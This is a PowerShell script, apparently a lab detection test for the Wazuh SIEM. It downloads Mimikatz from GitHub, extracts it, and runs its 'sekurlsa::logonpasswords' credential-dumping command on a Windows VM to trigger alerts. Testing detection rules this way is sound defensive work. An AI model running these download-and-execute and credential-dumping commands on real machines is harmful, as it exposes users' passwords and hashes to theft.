# Mimikatz Credential Dumping Test
# Run as Administrator on Windows 10 VM

Write-Host "[*] Starting Mimikatz test" -ForegroundColor Yellow

# Create working directory
$workingDir = "C:\MimikatzTest"
if (-not (Test-Path $workingDir)) {
    New-Item -ItemType Directory -Force -Path $workingDir | Out-Null
}
Set-Location $workingDir

# Download Mimikatz if not present
$mimikatzZip = "$workingDir\mimikatz.zip"
if (-not (Test-Path $mimikatzZip)) {
    Write-Host "[*] Downloading Mimikatz..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip" -OutFile $mimikatzZip
    Expand-Archive -Path $mimikatzZip -DestinationPath $workingDir -Force
}

# Navigate to Mimikatz directory
$mimikatzPath = "$workingDir\mimikatz_trunk\x64"
Set-Location $mimikatzPath

Write-Host "[*] Executing Mimikatz (safe test - version only)" -ForegroundColor Cyan
.\mimikatz.exe "version" "exit"

Write-Host "[*] Executing Mimikatz (credential access simulation)" -ForegroundColor Red
Write-Host "[!] This will trigger high-severity alerts in Wazuh" -ForegroundColor Yellow
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

Write-Host "[*] Mimikatz test complete. Check Wazuh dashboard for rule 100300/100301 alerts." -ForegroundColor Green
